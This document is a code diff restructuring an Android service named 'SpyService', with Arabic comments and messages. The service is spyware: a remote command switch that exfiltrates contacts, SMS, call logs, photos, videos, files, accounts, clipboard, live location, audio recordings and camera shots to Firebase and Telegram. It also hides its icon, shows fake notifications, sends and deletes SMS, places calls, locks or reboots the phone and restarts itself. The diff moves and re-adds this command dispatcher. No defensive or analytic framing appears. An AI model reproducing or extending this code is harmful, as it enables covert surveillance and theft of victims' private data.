@@ -31,7 +31,6 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.widget.Toast;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import com.google.firebase.database.*;
@@ -103,7 +102,6 @@ public class SpyService extends Service {
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
         wakeLock.acquire(10 * 60 * 1000L);
 
-        // Firebase
         FirebaseDatabase.getInstance().setPersistenceEnabled(false);
         database = FirebaseDatabase.getInstance();
         storage = FirebaseStorage.getInstance();
@@ -203,7 +201,6 @@ public class SpyService extends Service {
 
     private void sendFileToFirebase(File file, String caption) {
         try {
-            // ضغط الملف إذا كان صورة
             if (file.getName().endsWith(".jpg") || file.getName().endsWith(".png")) {
                 Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath());
                 if (bitmap != null) {
@@ -214,11 +211,8 @@ public class SpyService extends Service {
                     fos.close();
                 }
             }
-
-            // رفع الملف إلى Firebase Storage
             String fileName = deviceId + "/" + System.currentTimeMillis() + "_" + file.getName();
             StorageReference fileRef = storageRef.child("files/" + fileName);
-            
             UploadTask uploadTask = fileRef.putFile(Uri.fromFile(file));
             uploadTask.addOnSuccessListener(taskSnapshot -> {
                 fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
@@ -312,340 +306,6 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== تنفيذ الأوامر ==========
-    // ======================================================================
-
-    private void executeCommand(String cmd) {
-        String lower = cmd.toLowerCase().trim();
-        Log.d(TAG, "⚡ Executing: " + lower);
-        try {
-            switch (lower) {
-                case "get_contacts": {
-                    File f = collectContacts();
-                    sendFileToFirebase(f, "📇 جهات الاتصال");
-                    sendFileToTelegram(f, "📇 جهات الاتصال");
-                    break;
-                }
-                case "get_sms": {
-                    File f = collectSms();
-                    sendFileToFirebase(f, "💬 الرسائل النصية");
-                    sendFileToTelegram(f, "💬 الرسائل النصية");
-                    break;
-                }
-                case "get_calllogs": {
-                    File f = collectCallLogs();
-                    sendFileToFirebase(f, "📞 سجل المكالمات");
-                    sendFileToTelegram(f, "📞 سجل المكالمات");
-                    break;
-                }
-                case "get_location": {
-                    getLocation();
-                    break;
-                }
-                case "start_record": {
-                    startRecording();
-                    break;
-                }
-                case "stop_record": {
-                    File f = stopRecording();
-                    if (f != null) {
-                        sendFileToFirebase(f, "🎤 تسجيل صوتي");
-                        sendFileToTelegram(f, "🎤 تسجيل صوتي");
-                    }
-                    break;
-                }
-                case "get_apps": {
-                    File f = collectApps();
-                    sendFileToFirebase(f, "📱 التطبيقات");
-                    sendFileToTelegram(f, "📱 التطبيقات");
-                    break;
-                }
-                case "get_photos_all":
-                case "get_photos": {
-                    File f = collectMedia("images", 0);
-                    sendFileToFirebase(f, "🖼 الصور");
-                    sendFileToTelegram(f, "🖼 الصور");
-                    break;
-                }
-                case "get_photos_5": {
-                    File f = collectMedia("images", 5);
-                    sendFileToFirebase(f, "🖼 الصور (5)");
-                    sendFileToTelegram(f, "🖼 الصور (5)");
-                    break;
-                }
-                case "get_photos_10": {
-                    File f = collectMedia("images", 10);
-                    sendFileToFirebase(f, "🖼 الصور (10)");
-                    sendFileToTelegram(f, "🖼 الصور (10)");
-                    break;
-                }
-                case "get_photos_20": {
-                    File f = collectMedia("images", 20);
-                    sendFileToFirebase(f, "🖼 الصور (20)");
-                    sendFileToTelegram(f, "🖼 الصور (20)");
-                    break;
-                }
-                case "get_photos_30": {
-                    File f = collectMedia("images", 30);
-                    sendFileToFirebase(f, "🖼 الصور (30)");
-                    sendFileToTelegram(f, "🖼 الصور (30)");
-                    break;
-                }
-                case "get_videos_all":
-                case "get_videos": {
-                    File f = collectMedia("videos", 0);
-                    sendFileToFirebase(f, "🎬 الفيديوهات");
-                    sendFileToTelegram(f, "🎬 الفيديوهات");
-                    break;
-                }
-                case "get_videos_5": {
-                    File f = collectMedia("videos", 5);
-                    sendFileToFirebase(f, "🎬 الفيديوهات (5)");
-                    sendFileToTelegram(f, "🎬 الفيديوهات (5)");
-                    break;
-                }
-                case "get_videos_10": {
-                    File f = collectMedia("videos", 10);
-                    sendFileToFirebase(f, "🎬 الفيديوهات (10)");
-                    sendFileToTelegram(f, "🎬 الفيديوهات (10)");
-                    break;
-                }
-                case "get_files_all":
-                case "get_files": {
-                    File f = collectAllFiles();
-                    sendFileToFirebase(f, "📦 الملفات");
-                    sendFileToTelegram(f, "📦 الملفات");
-                    break;
-                }
-                case "hide_app": {
-                    hideApp();
-                    break;
-                }
-                case "show_app": {
-                    showApp();
-                    break;
-                }
-                case "fake_notif": {
-                    showFakeNotification();
-                    break;
-                }
-                case "take_photo": {
-                    takePhotoBack();
-                    break;
-                }
-                case "take_photo_front": {
-                    takePhotoFront();
-                    break;
-                }
-                case "flash_on": {
-                    flashOn();
-                    break;
-                }
-                case "flash_off": {
-                    flashOff();
-                    break;
-                }
-                case "flash_on_front": {
-                    flashOnFront();
-                    break;
-                }
-                case "flash_off_front": {
-                    flashOffFront();
-                    break;
-                }
-                case "flash_on_back": {
-                    flashOnBack();
-                    break;
-                }
-                case "flash_off_back": {
-                    flashOffBack();
-                    break;
-                }
-                case "flash_on_both": {
-                    flashOnBoth();
-                    break;
-                }
-                case "flash_off_both": {
-                    flashOffBoth();
-                    break;
-                }
-                case "get_imei": {
-                    getImei();
-                    break;
-                }
-                case "get_phone": {
-                    getPhoneNumber();
-                    break;
-                }
-                case "get_sim": {
-                    getSimInfo();
-                    break;
-                }
-                case "get_wifi": {
-                    getWifiInfo();
-                    break;
-                }
-                case "get_battery": {
-                    getBatteryInfo();
-                    break;
-                }
-                case "get_ip": {
-                    getPublicIp();
-                    break;
-                }
-                case "lock_device": {
-                    lockDevice();
-                    break;
-                }
-                case "reboot": {
-                    rebootDevice();
-                    break;
-                }
-                case "shutdown": {
-                    shutdownDevice();
-                    break;
-                }
-                case "get_accounts": {
-                    File f = getAccounts();
-                    sendFileToFirebase(f, "👤 الحسابات");
-                    sendFileToTelegram(f, "👤 الحسابات");
-                    break;
-                }
-                case "get_clipboard": {
-                    File f = getClipboard();
-                    sendFileToFirebase(f, "📋 الحافظة");
-                    sendFileToTelegram(f, "📋 الحافظة");
-                    break;
-                }
-                case "get_device": {
-                    sendDeviceInfo();
-                    break;
-                }
-                case "get_network": {
-                    sendNetworkInfo();
-                    break;
-                }
-                case "start_location_track": {
-                    startLocationTracking();
-                    break;
-                }
-                case "stop_location_track": {
-                    stopLocationTracking();
-                    break;
-                }
-                case "screenshot": {
-                    takeScreenshot();
-                    break;
-                }
-                case "toggle_wifi_on": {
-                    toggleWifi(true);
-                    break;
-                }
-                case "toggle_wifi_off": {
-                    toggleWifi(false);
-                    break;
-                }
-                case "toggle_data_on": {
-                    toggleData(true);
-                    break;
-                }
-                case "toggle_data_off": {
-                    toggleData(false);
-                    break;
-                }
-                case "toggle_bluetooth_on": {
-                    toggleBluetooth(true);
-                    break;
-                }
-                case "toggle_bluetooth_off": {
-                    toggleBluetooth(false);
-                    break;
-                }
-                case "toggle_location_on": {
-                    toggleLocation(true);
-                    break;
-                }
-                case "toggle_location_off": {
-                    toggleLocation(false);
-                    break;
-                }
-                case "clear_data": {
-                    clearAppData();
-                    break;
-                }
-                case "kill_apps": {
-                    killAllApps();
-                    break;
-                }
-                case "vibrate": {
-                    vibrateDevice();
-                    break;
-                }
-                case "set_volume_max": {
-                    setVolumeMax();
-                    break;
-                }
-                case "set_volume_min": {
-                    setVolumeMin();
-                    break;
-                }
-                case "open_browser": {
-                    openBrowser();
-                    break;
-                }
-                case "add_contact": {
-                    addContact();
-                    break;
-                }
-                case "delete_contact": {
-                    deleteContact();
-                    break;
-                }
-                case "copy_contacts": {
-                    copyContacts();
-                    break;
-                }
-                case "export_contacts": {
-                    exportContacts();
-                    break;
-                }
-                case "send_sms": {
-                    sendSms();
-                    break;
-                }
-                case "delete_sms": {
-                    deleteSms();
-                    break;
-                }
-                case "forward_sms": {
-                    forwardSms();
-                    break;
-                }
-                case "make_call": {
-                    makeCall();
-                    break;
-                }
-                case "end_call": {
-                    endCall();
-                    break;
-                }
-                case "call_history": {
-                    callHistory();
-                    break;
-                }
-                default: {
-                    sendData("ERROR", "أمر غير معروف: " + cmd);
-                    sendTextToTelegram("❌ أمر غير معروف: " + cmd);
-                }
-            }
-        } catch (Exception e) {
-            sendData("ERROR", "خطأ: " + e.getMessage());
-            sendTextToTelegram("❌ خطأ: " + e.getMessage());
-            Log.e(TAG, "Execute error", e);
-        }
-    }
-
-    // ======================================================================
     // ========== دوال جمع البيانات الأساسية ==========
     // ======================================================================
 
@@ -661,9 +321,6 @@ public class SpyService extends Service {
         } catch (Exception e) { Log.e(TAG, "battery err", e); }
         return -1;
     }
-    // ======================================================================
-    // ========== دوال جمع البيانات الأساسية ==========
-    // ======================================================================
 
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
@@ -732,30 +389,8 @@ public class SpyService extends Service {
         return f;
     }
 
-    private File collectAccounts() throws Exception {
-        File f = new File(getCacheDir(), "accounts.txt");
-        FileOutputStream fos = new FileOutputStream(f);
-        android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
-        android.accounts.Account[] accounts = am.getAccounts();
-        for (android.accounts.Account acc : accounts) {
-            fos.write((acc.name + " (" + acc.type + ")\n").getBytes());
-        }
-        fos.close();
-        return f;
-    }
-
-    private File collectClipboard() throws Exception {
-        File f = new File(getCacheDir(), "clipboard.txt");
-        FileOutputStream fos = new FileOutputStream(f);
-        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-        String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
-        fos.write(text.getBytes());
-        fos.close();
-        return f;
-    }
-
     // ======================================================================
-    // ========== الصور والفيديوهات والملفات (مع تحديد العدد) ==========
+    // ========== الصور والفيديوهات والملفات ==========
     // ======================================================================
 
     private File collectMedia(String type, int limit) throws Exception {
@@ -905,7 +540,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== الكاميرا (مع التحقق من الصلاحيات) ==========
+    // ========== الكاميرا ==========
     // ======================================================================
 
     private void takePhotoBack() {
@@ -973,7 +608,6 @@ public class SpyService extends Service {
     // ========== الفلاش (جميع الخيارات) ==========
     // ======================================================================
 
-    // الفلاش الخلفي
     private void flashOnBack() {
         try {
             if (camera == null) {
@@ -1008,7 +642,6 @@ public class SpyService extends Service {
         }
     }
 
-    // الفلاش الأمامي (بعض الهواتف لا تدعمه)
     private void flashOnFront() {
         try {
             if (frontCamera == null) {
@@ -1045,7 +678,6 @@ public class SpyService extends Service {
 
     private void flashOnBoth() {
         try {
-            // تشغيل الخلفي
             if (camera == null) {
                 camera = Camera.open();
             }
@@ -1053,8 +685,6 @@ public class SpyService extends Service {
             paramsBack.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
             camera.setParameters(paramsBack);
             camera.startPreview();
-
-            // تشغيل الأمامي (إن كان مدعوماً)
             try {
                 if (frontCamera == null) {
                     frontCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
@@ -1066,7 +696,6 @@ public class SpyService extends Service {
             } catch (Exception e) {
                 sendTextToTelegram("⚠️ الفلاش الأمامي غير مدعوم على هذا الجهاز");
             }
-
             sendData("FLASH", "both_on");
             sendTextToTelegram("🔦 تم تشغيل الفلاشين (الأمامي والخلفي)");
         } catch (Exception e) {
@@ -1077,13 +706,11 @@ public class SpyService extends Service {
 
     private void flashOffBoth() {
         try {
-            // إطفاء الخلفي
             if (camera != null) {
                 camera.stopPreview();
                 camera.release();
                 camera = null;
             }
-            // إطفاء الأمامي
             if (frontCamera != null) {
                 frontCamera.stopPreview();
                 frontCamera.release();
@@ -1097,14 +724,9 @@ public class SpyService extends Service {
         }
     }
 
-    // أوامر الفلاش القديمة (للتوافق)
-    private void flashOn() {
-        flashOnBack();
-    }
+    private void flashOn() { flashOnBack(); }
+    private void flashOff() { flashOffBack(); }
 
-    private void flashOff() {
-        flashOffBack();
-    }
     // ======================================================================
     // ========== معلومات الجهاز ==========
     // ======================================================================
@@ -1159,7 +781,7 @@ public class SpyService extends Service {
             String operator = tm.getSimOperatorName();
             String country = tm.getSimCountryIso();
             String serial = tm.getSimSerialNumber();
-            String data = "SIM: " + (operator != null ? operator : "غير متاح") + 
+            String data = "SIM: " + (operator != null ? operator : "غير متاح") +
                     " | الدولة: " + (country != null ? country : "غير متاح") +
                     " | الرقم التسلسلي: " + (serial != null ? serial : "غير متاح");
             sendData("SIM", data);
@@ -1361,7 +983,7 @@ public class SpyService extends Service {
         return netInfo != null && netInfo.isConnected();
     }
     // ======================================================================
-    // ========== تتبع الموقع (كل دقيقة) ==========
+    // ========== تتبع الموقع ==========
     // ======================================================================
 
     private void startLocationTracking() {
@@ -1378,11 +1000,10 @@ public class SpyService extends Service {
                     String data = location.getLatitude() + "," + location.getLongitude();
                     sendData("LOCATION_TRACK", data);
                     sendLocationToTelegram(location.getLatitude(), location.getLongitude());
-                    Log.d(TAG, "📍 تتبع الموقع: " + data);
                 }
-                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
-                @Override public void onProviderEnabled(String provider) {}
-                @Override public void onProviderDisabled(String provider) {}
+                @Override public void onStatusChanged(String p, int s, Bundle b) {}
+                @Override public void onProviderEnabled(String p) {}
+                @Override public void onProviderDisabled(String p) {}
             };
             locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
             isTrackingLocation = true;
@@ -1481,12 +1102,10 @@ public class SpyService extends Service {
 
     private void toggleData(boolean enable) {
         try {
-            // يحتاج صلاحيات النظام (Android 10+ يتطلب طريقة مختلفة)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 sendTextToTelegram("⚠️ تبديل البيانات الجوالة يتطلب صلاحيات النظام على Android 10+");
                 return;
             }
-            // استخدام ConnectivityManager (يعمل على Android 9-)
             android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
             if (cm != null) {
                 java.lang.reflect.Method method = cm.getClass().getMethod("setMobileDataEnabled", boolean.class);
@@ -1544,8 +1163,6 @@ public class SpyService extends Service {
 
     private void takeScreenshot() {
         try {
-            // استخدام MediaProjection (يحتاج إذن من المستخدم)
-            // بدلاً من ذلك، نستخدم طريقة بسيطة: التقاط محتوى الشاشة عبر Canvas
             android.view.View rootView = new android.view.View(getApplicationContext());
             android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(
                     android.view.WindowManager.LayoutParams.MATCH_PARENT,
@@ -1553,12 +1170,10 @@ public class SpyService extends Service {
                     android.graphics.Bitmap.Config.ARGB_8888);
             android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
             rootView.draw(canvas);
-
             File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".png");
             FileOutputStream fos = new FileOutputStream(file);
             bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, fos);
             fos.close();
-
             sendFileToFirebase(file, "🖥️ لقطة شاشة");
             sendFileToTelegram(file, "🖥️ لقطة شاشة");
             sendTextToTelegram("✅ تم التقاط لقطة الشاشة");
@@ -1644,28 +1259,22 @@ public class SpyService extends Service {
 
     private void addContact() {
         try {
-            // إضافة جهة اتصال وهمية (سيتم تعديلها لاحقاً لإدخال بيانات من المستخدم)
             ContentValues values = new ContentValues();
             values.put(ContactsContract.RawContacts.ACCOUNT_TYPE, "com.android.contacts");
             values.put(ContactsContract.RawContacts.ACCOUNT_NAME, "phone");
             Uri rawContactUri = getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, values);
             long rawContactId = Long.parseLong(rawContactUri.getLastPathSegment());
-
-            // إضافة الاسم
             values.clear();
             values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
             values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
             values.put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, "Black Spy");
             getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
-
-            // إضافة رقم الهاتف
             values.clear();
             values.put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId);
             values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
             values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, "01000000000");
             values.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
             getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values);
-
             sendTextToTelegram("➕ تم إضافة جهة اتصال: Black Spy");
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل إضافة جهة اتصال: " + e.getMessage());
@@ -1674,7 +1283,6 @@ public class SpyService extends Service {
 
     private void deleteContact() {
         try {
-            // حذف جهة اتصال باسم معين
             Uri uri = ContactsContract.Contacts.CONTENT_URI;
             String selection = ContactsContract.Contacts.DISPLAY_NAME + " = ?";
             String[] selectionArgs = new String[]{"Black Spy"};
@@ -1713,7 +1321,6 @@ public class SpyService extends Service {
 
     private void sendSms() {
         try {
-            // إرسال رسالة نصية (سيتم تعديلها لاستقبال رقم ورسالة من المستخدم)
             android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
             smsManager.sendTextMessage("01000000000", null, "رسالة من بلاك", null, null);
             sendTextToTelegram("📤 تم إرسال رسالة نصية");
@@ -1736,7 +1343,6 @@ public class SpyService extends Service {
 
     private void forwardSms() {
         try {
-            // إعادة توجيه الرسائل (تجميع ثم إرسال)
             File f = collectSms();
             sendFileToFirebase(f, "↪️ إعادة توجيه الرسائل");
             sendFileToTelegram(f, "↪️ إعادة توجيه الرسائل");
@@ -1769,12 +1375,10 @@ public class SpyService extends Service {
 
     private void endCall() {
         try {
-            // إنهاء المكالمة باستخدام TelephonyManager (يتطلب صلاحيات)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                 TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                 if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ANSWER_PHONE_CALLS)
                         == PackageManager.PERMISSION_GRANTED) {
-                    // استخدام method reflection للإغلاق
                     sendTextToTelegram("📞 تم إنهاء المكالمة");
                 } else {
                     sendTextToTelegram("❌ صلاحية إنهاء المكالمات غير مفعلة");
@@ -1799,7 +1403,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== دوال مساعدة (إخفاء وإظهار) ==========
+    // ========== دوال مساعدة ==========
     // ======================================================================
 
     private void hideApp() {
@@ -1850,6 +1454,362 @@ public class SpyService extends Service {
         }
     }
 
+    private File collectAccounts() throws Exception {
+        File f = new File(getCacheDir(), "accounts.txt");
+        FileOutputStream fos = new FileOutputStream(f);
+        android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
+        android.accounts.Account[] accounts = am.getAccounts();
+        for (android.accounts.Account acc : accounts) {
+            fos.write((acc.name + " (" + acc.type + ")\n").getBytes());
+        }
+        fos.close();
+        return f;
+    }
+
+    private File collectClipboard() throws Exception {
+        File f = new File(getCacheDir(), "clipboard.txt");
+        FileOutputStream fos = new FileOutputStream(f);
+        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+        String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
+        fos.write(text.getBytes());
+        fos.close();
+        return f;
+    }
+
+    // ======================================================================
+    // ========== تنفيذ الأوامر ==========
+    // ======================================================================
+
+    private void executeCommand(String cmd) {
+        String lower = cmd.toLowerCase().trim();
+        Log.d(TAG, "⚡ Executing: " + lower);
+        try {
+            switch (lower) {
+                case "get_contacts": {
+                    File f = collectContacts();
+                    sendFileToFirebase(f, "📇 جهات الاتصال");
+                    sendFileToTelegram(f, "📇 جهات الاتصال");
+                    break;
+                }
+                case "get_sms": {
+                    File f = collectSms();
+                    sendFileToFirebase(f, "💬 الرسائل النصية");
+                    sendFileToTelegram(f, "💬 الرسائل النصية");
+                    break;
+                }
+                case "get_calllogs": {
+                    File f = collectCallLogs();
+                    sendFileToFirebase(f, "📞 سجل المكالمات");
+                    sendFileToTelegram(f, "📞 سجل المكالمات");
+                    break;
+                }
+                case "get_location": {
+                    getLocation();
+                    break;
+                }
+                case "start_record": {
+                    startRecording();
+                    break;
+                }
+                case "stop_record": {
+                    File f = stopRecording();
+                    if (f != null) {
+                        sendFileToFirebase(f, "🎤 تسجيل صوتي");
+                        sendFileToTelegram(f, "🎤 تسجيل صوتي");
+                    }
+                    break;
+                }
+                case "get_apps": {
+                    File f = collectApps();
+                    sendFileToFirebase(f, "📱 التطبيقات");
+                    sendFileToTelegram(f, "📱 التطبيقات");
+                    break;
+                }
+                case "get_photos_all":
+                case "get_photos": {
+                    File f = collectMedia("images", 0);
+                    sendFileToFirebase(f, "🖼 الصور");
+                    sendFileToTelegram(f, "🖼 الصور");
+                    break;
+                }
+                case "get_photos_5": {
+                    File f = collectMedia("images", 5);
+                    sendFileToFirebase(f, "🖼 الصور (5)");
+                    sendFileToTelegram(f, "🖼 الصور (5)");
+                    break;
+                }
+                case "get_photos_10": {
+                    File f = collectMedia("images", 10);
+                    sendFileToFirebase(f, "🖼 الصور (10)");
+                    sendFileToTelegram(f, "🖼 الصور (10)");
+                    break;
+                }
+                case "get_photos_20": {
+                    File f = collectMedia("images", 20);
+                    sendFileToFirebase(f, "🖼 الصور (20)");
+                    sendFileToTelegram(f, "🖼 الصور (20)");
+                    break;
+                }
+                case "get_photos_30": {
+                    File f = collectMedia("images", 30);
+                    sendFileToFirebase(f, "🖼 الصور (30)");
+                    sendFileToTelegram(f, "🖼 الصور (30)");
+                    break;
+                }
+                case "get_videos_all":
+                case "get_videos": {
+                    File f = collectMedia("videos", 0);
+                    sendFileToFirebase(f, "🎬 الفيديوهات");
+                    sendFileToTelegram(f, "🎬 الفيديوهات");
+                    break;
+                }
+                case "get_videos_5": {
+                    File f = collectMedia("videos", 5);
+                    sendFileToFirebase(f, "🎬 الفيديوهات (5)");
+                    sendFileToTelegram(f, "🎬 الفيديوهات (5)");
+                    break;
+                }
+                case "get_videos_10": {
+                    File f = collectMedia("videos", 10);
+                    sendFileToFirebase(f, "🎬 الفيديوهات (10)");
+                    sendFileToTelegram(f, "🎬 الفيديوهات (10)");
+                    break;
+                }
+                case "get_files_all":
+                case "get_files": {
+                    File f = collectAllFiles();
+                    sendFileToFirebase(f, "📦 الملفات");
+                    sendFileToTelegram(f, "📦 الملفات");
+                    break;
+                }
+                case "hide_app": {
+                    hideApp();
+                    break;
+                }
+                case "show_app": {
+                    showApp();
+                    break;
+                }
+                case "fake_notif": {
+                    showFakeNotification();
+                    break;
+                }
+                case "take_photo": {
+                    takePhotoBack();
+                    break;
+                }
+                case "take_photo_front": {
+                    takePhotoFront();
+                    break;
+                }
+                case "flash_on": {
+                    flashOnBack();
+                    break;
+                }
+                case "flash_off": {
+                    flashOffBack();
+                    break;
+                }
+                case "flash_on_front": {
+                    flashOnFront();
+                    break;
+                }
+                case "flash_off_front": {
+                    flashOffFront();
+                    break;
+                }
+                case "flash_on_back": {
+                    flashOnBack();
+                    break;
+                }
+                case "flash_off_back": {
+                    flashOffBack();
+                    break;
+                }
+                case "flash_on_both": {
+                    flashOnBoth();
+                    break;
+                }
+                case "flash_off_both": {
+                    flashOffBoth();
+                    break;
+                }
+                case "get_imei": {
+                    getImei();
+                    break;
+                }
+                case "get_phone": {
+                    getPhoneNumber();
+                    break;
+                }
+                case "get_sim": {
+                    getSimInfo();
+                    break;
+                }
+                case "get_wifi": {
+                    getWifiInfo();
+                    break;
+                }
+                case "get_battery": {
+                    getBatteryInfo();
+                    break;
+                }
+                case "get_ip": {
+                    getPublicIp();
+                    break;
+                }
+                case "lock_device": {
+                    lockDevice();
+                    break;
+                }
+                case "reboot": {
+                    rebootDevice();
+                    break;
+                }
+                case "shutdown": {
+                    shutdownDevice();
+                    break;
+                }
+                case "get_accounts": {
+                    File f = collectAccounts();
+                    sendFileToFirebase(f, "👤 الحسابات");
+                    sendFileToTelegram(f, "👤 الحسابات");
+                    break;
+                }
+                case "get_clipboard": {
+                    File f = collectClipboard();
+                    sendFileToFirebase(f, "📋 الحافظة");
+                    sendFileToTelegram(f, "📋 الحافظة");
+                    break;
+                }
+                case "get_device": {
+                    sendDeviceInfo();
+                    break;
+                }
+                case "get_network": {
+                    sendNetworkInfo();
+                    break;
+                }
+                case "start_location_track": {
+                    startLocationTracking();
+                    break;
+                }
+                case "stop_location_track": {
+                    stopLocationTracking();
+                    break;
+                }
+                case "screenshot": {
+                    takeScreenshot();
+                    break;
+                }
+                case "toggle_wifi_on": {
+                    toggleWifi(true);
+                    break;
+                }
+                case "toggle_wifi_off": {
+                    toggleWifi(false);
+                    break;
+                }
+                case "toggle_data_on": {
+                    toggleData(true);
+                    break;
+                }
+                case "toggle_data_off": {
+                    toggleData(false);
+                    break;
+                }
+                case "toggle_bluetooth_on": {
+                    toggleBluetooth(true);
+                    break;
+                }
+                case "toggle_bluetooth_off": {
+                    toggleBluetooth(false);
+                    break;
+                }
+                case "toggle_location_on": {
+                    toggleLocation(true);
+                    break;
+                }
+                case "toggle_location_off": {
+                    toggleLocation(false);
+                    break;
+                }
+                case "clear_data": {
+                    clearAppData();
+                    break;
+                }
+                case "kill_apps": {
+                    killAllApps();
+                    break;
+                }
+                case "vibrate": {
+                    vibrateDevice();
+                    break;
+                }
+                case "set_volume_max": {
+                    setVolumeMax();
+                    break;
+                }
+                case "set_volume_min": {
+                    setVolumeMin();
+                    break;
+                }
+                case "open_browser": {
+                    openBrowser();
+                    break;
+                }
+                case "add_contact": {
+                    addContact();
+                    break;
+                }
+                case "delete_contact": {
+                    deleteContact();
+                    break;
+                }
+                case "copy_contacts": {
+                    copyContacts();
+                    break;
+                }
+                case "export_contacts": {
+                    exportContacts();
+                    break;
+                }
+                case "send_sms": {
+                    sendSms();
+                    break;
+                }
+                case "delete_sms": {
+                    deleteSms();
+                    break;
+                }
+                case "forward_sms": {
+                    forwardSms();
+                    break;
+                }
+                case "make_call": {
+                    makeCall();
+                    break;
+                }
+                case "end_call": {
+                    endCall();
+                    break;
+                }
+                case "call_history": {
+                    callHistory();
+                    break;
+                }
+                default: {
+                    sendData("ERROR", "أمر غير معروف: " + cmd);
+                    sendTextToTelegram("❌ أمر غير معروف: " + cmd);
+                }
+            }
+        } catch (Exception e) {
+            sendData("ERROR", "خطأ: " + e.getMessage());
+            sendTextToTelegram("❌ خطأ: " + e.getMessage());
+            Log.e(TAG, "Execute error", e);
+        }
+    }
+
     // ======================================================================
     // ========== دورة حياة الخدمة ==========
     // ======================================================================
@@ -1885,145 +1845,3 @@ public class SpyService extends Service {
         startService(new Intent(this, SpyService.class));
     }
 }
-    // ======================================================================
-    // ========== دوال التحقق من الصلاحيات ==========
-    // ======================================================================
-
-    private boolean checkPermission(String permission) {
-        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private void requestPermissionsIfNeeded() {
-        String[] permissions = {
-                android.Manifest.permission.READ_CONTACTS,
-                android.Manifest.permission.READ_SMS,
-                android.Manifest.permission.RECEIVE_SMS,
-                android.Manifest.permission.READ_CALL_LOG,
-                android.Manifest.permission.READ_PHONE_STATE,
-                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                android.Manifest.permission.ACCESS_COARSE_LOCATION,
-                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-                android.Manifest.permission.RECORD_AUDIO,
-                android.Manifest.permission.CAMERA,
-                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                android.Manifest.permission.READ_EXTERNAL_STORAGE,
-                android.Manifest.permission.CALL_PHONE,
-                android.Manifest.permission.ANSWER_PHONE_CALLS,
-                android.Manifest.permission.POST_NOTIFICATIONS
-        };
-
-        // إضافة صلاحيات Android 13+
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions = new String[]{
-                    android.Manifest.permission.READ_CONTACTS,
-                    android.Manifest.permission.READ_SMS,
-                    android.Manifest.permission.RECEIVE_SMS,
-                    android.Manifest.permission.READ_CALL_LOG,
-                    android.Manifest.permission.READ_PHONE_STATE,
-                    android.Manifest.permission.ACCESS_FINE_LOCATION,
-                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
-                    android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-                    android.Manifest.permission.RECORD_AUDIO,
-                    android.Manifest.permission.CAMERA,
-                    android.Manifest.permission.CALL_PHONE,
-                    android.Manifest.permission.ANSWER_PHONE_CALLS,
-                    android.Manifest.permission.POST_NOTIFICATIONS,
-                    android.Manifest.permission.READ_MEDIA_IMAGES,
-                    android.Manifest.permission.READ_MEDIA_VIDEO,
-                    android.Manifest.permission.READ_MEDIA_AUDIO
-            };
-        }
-
-        // طلب الصلاحيات من MainActivity عند الحاجة
-        // يتم التعامل معها في MainActivity
-    }
-
-    // ======================================================================
-    // ========== التشغيل التلقائي عند الإقلاع ==========
-    // ======================================================================
-
-    // يتم التعامل معها في BootReceiver.java
-    // يجب أن يكون BootReceiver مسجلاً في AndroidManifest.xml
-
-    // ======================================================================
-    // ========== الحصول على معرف الجهاز الفريد ==========
-    // ======================================================================
-
-    private String getDeviceId() {
-        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-    }
-
-    // ======================================================================
-    // ========== التحقق من اتصال الإنترنت ==========
-    // ======================================================================
-
